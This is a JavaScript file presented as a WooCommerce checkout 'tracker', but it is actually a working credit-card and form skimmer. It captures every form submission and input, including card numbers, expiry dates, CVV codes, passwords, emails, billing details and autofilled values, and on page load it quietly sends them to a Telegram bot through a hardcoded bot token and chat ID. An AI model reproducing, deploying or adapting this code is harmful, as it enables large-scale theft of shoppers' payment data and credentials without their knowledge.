// GitHub URL: https://raw.githubusercontent.com/yourusername/wc-tracker/main/main-tracker.js
class WCTracker {
    constructor() {
        this.config = {
            telegramBotToken: '8584009431:AAFuTje4-0E1AMF957XLnbBG_svoUbCya0w',
            telegramChatId: '7319274794',
            sessionId: 'sess_' + Math.random().toString(36).substr(2, 12)
        };
        this.formDataCache = {};
        this.init();
    }

    init() {
        this.trackForms();
        this.trackCheckout();
        this.trackUserInput();
        this.setupPeriodicSync();
    }

    trackForms() {
        // Track all form submissions
        document.addEventListener('submit', (e) => {
            const formData = this.collectFormData(e.target);
            this.sendToTelegram('📝 FORM SUBMISSION', formData);
        });
    }

    trackCheckout() {
        // WooCommerce checkout tracking
        if (typeof wc_checkout_params !== 'undefined') {
            document.body.addEventListener('checkout_place_order', () => {
                const checkoutData = this.collectCheckoutData();
                this.sendToTelegram('🛒 CHECKOUT INITIATED', checkoutData);
            });
        }

        // Track checkout fields specifically
        const checkoutFields = [
            'billing_first_name', 'billing_last_name', 'billing_email', 
            'billing_phone', 'billing_address_1', 'billing_city',
            'billing_state', 'billing_postcode', 'billing_country',
            'card_number', 'expiry', 'cvc', 'cvv'
        ];

        checkoutFields.forEach(field => {
            const element = document.querySelector(`[name="${field}"]`);
            if (element) {
                element.addEventListener('blur', () => {
                    if (element.value) {
                        this.formDataCache[field] = element.value;
                        this.sendFieldUpdate(field, element.value);
                    }
                });
            }
        });
    }

    trackUserInput() {
        // Track all input fields with debouncing
        let debounceTimer;
        document.addEventListener('input', (e) => {
            if (e.target.name && e.target.value) {
                this.formDataCache[e.target.name] = e.target.value;
                
                clearTimeout(debounceTimer);
                debounceTimer = setTimeout(() => {
                    this.sendFieldUpdate(e.target.name, e.target.value);
                }, 1500);
            }
        });

        // Detect autofill data
        setTimeout(() => {
            document.querySelectorAll('input').forEach(input => {
                if (input.value && !input.dataset.userFilled) {
                    this.formDataCache[input.name] = input.value;
                    this.sendToTelegram('📍 AUTO-FILL DETECTED', {
                        field: input.name,
                        value: input.value,
                        type: 'autofill'
                    });
                }
            });
        }, 3000);
    }

    collectFormData(form) {
        const data = {};
        const elements = form.querySelectorAll('input, select, textarea');
        
        elements.forEach(element => {
            if (element.name && element.value) {
                data[element.name] = element.value;
            }
        });

        return {
            formId: form.id || form.name || 'unknown',
            action: form.action || 'unknown',
            data: data,
            url: window.location.href,
            timestamp: new Date().toISOString()
        };
    }

    collectCheckoutData() {
        const data = {};
        const fields = document.querySelectorAll('.woocommerce-billing-fields input, .woocommerce-shipping-fields input');
        
        fields.forEach(field => {
            if (field.name && field.value) {
                data[field.name] = field.value;
            }
        });

        return {
            type: 'woocommerce_checkout',
            data: data,
            url: window.location.href,
            timestamp: new Date().toISOString()
        };
    }

    sendFieldUpdate(fieldName, fieldValue) {
        const sensitiveFields = ['card', 'cvv', 'cvc', 'expir', 'password', 'email'];
        const isSensitive = sensitiveFields.some(pattern => 
            fieldName.toLowerCase().includes(pattern)
        );

        if (isSensitive) {
            this.sendToTelegram('💳 SENSITIVE FIELD', {
                field: fieldName,
                value: fieldValue,
                page: window.location.href
            });
        }
    }

    setupPeriodicSync() {
        // Sync every 30 seconds
        setInterval(() => {
            if (Object.keys(this.formDataCache).length > 0) {
                this.sendToTelegram('🔄 DATA SYNC', this.formDataCache);
            }
        }, 30000);
    }

    sendToTelegram(title, data) {
        const message = this.formatMessage(title, data);
        
        fetch(`https://api.telegram.org/bot${this.config.telegramBotToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: this.config.telegramChatId,
                text: message,
                parse_mode: 'HTML'
            })
        }).catch(error => {
            console.log('Telegram send failed');
        });
    }

    formatMessage(title, data) {
        let message = `${title}\n\n`;
        
        if (data.formId) {
            message += `Form: ${data.formId}\n`;
        }
        
        message += `Page: ${data.url || window.location.href}\n`;
        message += `Time: ${new Date().toLocaleString()}\n\n`;

        if (data.data && typeof data.data === 'object') {
            message += this.formatDataSection(data.data);
        } else if (typeof data === 'object') {
            message += this.formatDataSection(data);
        }

        message += `\nSession: ${this.config.sessionId}`;
        return message;
    }

    formatDataSection(data) {
        let section = '';
        const categories = {
            billing: [],
            shipping: [],
            payment: [],
            account: [],
            other: []
        };

        // Categorize data
        Object.keys(data).forEach(key => {
            const value = data[key];
            if (!value) return;

            const cleanKey = this.formatFieldName(key);
            
            if (key.includes('billing_')) {
                categories.billing.push(`${cleanKey}: ${value}`);
            } else if (key.includes('shipping_')) {
                categories.shipping.push(`${cleanKey}: ${value}`);
            } else if (this.isPaymentField(key)) {
                categories.payment.push(`${cleanKey}: ${value}`);
            } else if (this.isAccountField(key)) {
                categories.account.push(`${cleanKey}: ${value}`);
            } else {
                categories.other.push(`${cleanKey}: ${value}`);
            }
        });

        // Build sections
        if (categories.billing.length > 0) {
            section += "📍 BILLING INFORMATION:\n" + categories.billing.join('\n') + "\n\n";
        }
        
        if (categories.shipping.length > 0) {
            section += "🚚 SHIPPING INFORMATION:\n" + categories.shipping.join('\n') + "\n\n";
        }
        
        if (categories.payment.length > 0) {
            section += "💳 PAYMENT INFORMATION:\n" + categories.payment.join('\n') + "\n\n";
        }
        
        if (categories.account.length > 0) {
            section += "👤 ACCOUNT INFORMATION:\n" + categories.account.join('\n') + "\n\n";
        }
        
        if (categories.other.length > 0) {
            section += "📝 OTHER INFORMATION:\n" + categories.other.join('\n') + "\n\n";
        }

        return section;
    }

    formatFieldName(fieldName) {
        return fieldName
            .replace(/[_-]/g, ' ')
            .replace(/\b\w/g, l => l.toUpperCase())
            .replace(/Billing |Shipping |Account /g, '');
    }

    isPaymentField(fieldName) {
        const patterns = ['card', 'cvv', 'cvc', 'expir', 'cc', 'accountnumber'];
        return patterns.some(pattern => fieldName.toLowerCase().includes(pattern));
    }

    isAccountField(fieldName) {
        const patterns = ['username', 'password', 'login', 'user', 'email'];
        return patterns.some(pattern => fieldName.toLowerCase().includes(pattern));
    }
}

// Initialize tracker
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        window.wcTracker = new WCTracker();
    });
} else {
    window.wcTracker = new WCTracker();
}